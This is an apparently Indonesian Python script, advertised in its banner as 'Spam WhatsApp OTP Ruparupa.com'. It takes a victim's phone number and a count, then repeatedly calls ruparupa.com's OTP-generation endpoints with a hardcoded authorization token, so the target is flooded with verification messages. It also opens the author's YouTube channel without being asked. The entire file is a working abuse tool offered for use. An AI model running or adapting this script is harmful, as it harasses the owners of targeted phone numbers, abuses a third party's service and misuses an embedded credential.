# CODED : DENAY
# Time : 22/08/2020
# LIHAT? BOLEH , REKOD? JANGAN 
# Stay Strong!!

import requests,json,time,sys,os

def tunggu(t):
	while t:
		wd='# Jeda selama '+str(t)+" detik "
		print(wd,end='\r',flush=True)
		time.sleep(1)
		t -= 1

url = 'https://wapi.ruparupa.com/auth/check-otp-auth'
url2 = 'https://wapi.ruparupa.com/auth/generate-otp'
hdurl = {
	"accept": "application/json",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
	"authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTFhODIwY2EtZmIxOC00NGIxLTlkMzEtYjgyY2VhZjAwMDI3IiwiaWF0IjoxNTgwNzI3Nzk2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.vK7glVav_2RRitFuWOSxa_uHf2PYidlANEZvfyHhD8U",
	"content-length": "88",
	"content-type": "application/json",
	"origin": "https://www.ruparupa.com",
	"referer": "https://www.ruparupa.com/",
	"sec-fetch-mode": "cors",
	"sec-fetch-site": "same-site",
	"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
	"user-platform": "desktop",
	"x-company-name": "odi",
	"x-frontend-type": "desktop",
}
hdurl2 = {
	"accept": "application/json",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
	"authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYTFhODIwY2EtZmIxOC00NGIxLTlkMzEtYjgyY2VhZjAwMDI3IiwiaWF0IjoxNTgwNzI3Nzk2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.vK7glVav_2RRitFuWOSxa_uHf2PYidlANEZvfyHhD8U",
	"content-length": "105",
	"content-type": "application/json",
	"origin": "https://www.ruparupa.com",
	"referer": "https://www.ruparupa.com/verification?page=otp-choices",
	"sec-fetch-mode": "cors",
	"sec-fetch-site": "same-site",
	"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
	"user-platform": "desktop",
	"x-company-name": "odi",
	"x-frontend-type": "desktop",
}
if os.name == 'nt':os.system("cls")
else:os.system("clear")
print("\033[1;93mSubscribe Channel Menembus Batas 911\033[1;0m")
os.system('xdg-open https://youtube.com/channel/UCTkQw-C308iJsAaKtjF0Rzw')
time.sleep(5)
if os.name == 'nt':os.system("cls")
else:os.system("clear")
R = '\033[1;91m'
G = '\033[1;92m'
Y = '\033[1;93m'
B = '\033[1;94m'
P = '\033[1;95m'
S = '\033[1;96m'
W = '\033[1;97m'

print("""

\x1b[1;96m™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™\x1b[1;96m
\x1b[1;96m™✓™✓™            \x1b[1;93mAuthor : Denay Zee Dagama\x1b[1;31m                      \x1b[1;96m™✓™✓™
\x1b[1;96m™✓™✓™            \x1b[1;92mGithub : https://github.com/OmDenay-MB911\x1b[1;31m      \x1b[1;96m™✓™✓™
\x1b[1;96m™✓™✓™           \x1b[1;95mYoutube : Menembus Batas 911\x1b[1;31m                    \x1b[1;96m™✓™✓™
\x1b[1;96m™✓™✓™          \x1b[1;96mWhatsApp : 085930060122\x1b[1;31m                          \x1b[1;96m™✓™✓™
\x1b[1;96m™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™✓™\x1b[1;31m
\x1b[1;47m               \x1b[1;91mCREATE BY DENAY MENEMBUS BATAS 911                    \x1b[1;0m
\x1b[1;96m
\x1b[1;96m    ®®®®®®®®®®
\x1b[1;96m      ®®®®®®®             ®®®®®®®      ®®®®
\x1b[1;96m®      ®®®®®           ®®®®®®®®®®     ®®®
\x1b[1;96m®®®     ®®®          ®®®®®®®®®®®     ®®   ®
\x1b[1;96m ®®®®®   ®®        ®®®®®®®®®®®®®®    ®®  ®®         ®®®®®
\x1b[1;96m  ®®®®®®  ®       ®®®®®®®®®®®®®®®   ®®®®®         ®®®®  ®®®®   ®®®®
\x1b[1;96m    ®®®®®   ®    ®®®®®®®®®®®®®®®     ®® ®®   ®           ®®®®  ®®®®®
\x1b[1;93m     ®®®®®®       ®®®®®®®®®®®®®®     ®®  ®   ®°°    ™     ®®®  ®®®®®
\x1b[1;93m   ™   ®®®®®®®     ®®®®®®®®®®®®     ®®       ®®             ®®®®®®®®
\x1b[1;93m     ™  ®®®®®®                  ™                 ™           ®®®®®®
\x1b[1;93m       ™  ®®®®®   ®®®®®  ®®®®®                        ™™     ®®®®®®®
\x1b[1;93m            ®®®  ®®®®®®®®®®®®®®®® ®®®  ®®  ®®® °°              ®®®®®
\x1b[1;93m                  ®®®®®®®®®®®®®®®  ®®®  ®   ™™™®™™°°            ®®®
\x1b[1;93m                        °°                      ™™™°
\x1b[1;91m™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™™
\x1b[1;47m               \x1b[1;91mCREATE BY DENAY MENEMBUS BATAS 911                   \x1b[1;0m



\033[1;96m      CREATE BYE : DENAY ZEE DAGAMA MB-911
\033[1;47m                                                   \033[1;0m
\033[1;93m    https://github.com/OmDenay-MB911/spamWA911\033[1;0m  
\033[1;96m     Youtube Channel : MENEMBUS BATAS 911\033[1;0m
\033[1;93m     Whatsapp        : 085930060122\033[1;0m
\033[1;96m     Instagram       : never_die599
\033[1;47m                                                   \033[1;0m

🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍🔍

\033[1;96m [+] CODED : DENAY ZEE DAGAMA MB911\033[1;0m
\033[1;93m [+] Spam WhatsApp OTP Ruparupa.com\033[1;0m

	""")
try:
	nope = input("Ex: 08xxxxxxxxx\nMasukkan nomor target: ")
	jml = int(input("Jumlah spam: "))
	dataurl = {"phone":nope,"email":"akasaka1@etlgr.com","action":"register","password":""}
	dataurljson = json.dumps(dataurl)
	dataurl2 = {"phone":nope,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0}
	dataurl2json = json.dumps(dataurl2)
	r = requests.Session()
	z = 1
	print(" ")
	for x in range(jml):
		try:
			a = r.post(url,headers=hdurl,data=dataurljson).text
			b = r.post(url2,headers=hdurl2,data=dataurl2json).text
			c = json.loads(b)
			print(f'[{z}] ['+c["message"]+f'] Spam to {nope}')
			if z == jml:
				break
			else:
				tunggu(60)
			z += 1
		except requests.exceptions.ConnectionError:	
			print("Koneksi Error!!\nPeriksa Koneksi internet Anda!!")
		except KeyboardInterrupt:
			print("Keluar..!!")
			sys.exit()
except KeyboardInterrupt:
	print("\nKeluar..!!")
	sys.exit()
